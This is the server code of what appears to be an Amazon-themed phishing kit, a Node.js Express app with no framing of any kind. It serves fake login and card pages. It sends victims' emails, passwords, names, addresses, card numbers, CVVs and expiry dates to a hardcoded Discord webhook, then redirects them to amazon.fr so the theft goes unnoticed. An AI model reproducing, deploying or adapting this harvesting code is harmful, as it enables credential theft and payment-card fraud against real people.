const express = require('express');
var bodyParser = require('body-parser');
const app = express();
const {Webhook} = require('simple-discord-webhooks');

const webhook = new Webhook('https://discord.com/api/webhooks/906575921354530816/XkeaOm1cFLKKejdH9uI3VVrzFOY0mVml3jOB-8IH6AVbpNVCimwhVcDXzyylIJP2siDh');
app.use(express.static('public'));
app.use(bodyParser.urlencoded({
  extended: true
}));
app.get('/', (req, res) => {
  res.sendFile(__dirname + '/login.html')
});
app.get('/card', (req, res) => {
  res.sendFile(__dirname + '/card.html')
});
app.get('/login', (req, res) => {
  res.sendFile(__dirname + '/login.html')
});

app.post('/', (req, res) => {
  webhook.send(req.body.email + ":" + req.body.password)
  res.sendFile(__dirname + '/card.html')
})
app.post('/card', (req, res) => {
  
  webhook.send(`
Nom : ${req.body.name}
Adresse : ${req.body.address}
Code postal : ${req.body.zipCode}
Ville : ${req.body.city}
Carte : ${req.body.cardNumber}
CVV : ${req.body.cvv}
Date : ${req.body.month}/${req.body.year}
  `)
  res.redirect('https://amazon.fr')
})

app.listen(3000, () => {
  console.log('server started');
});
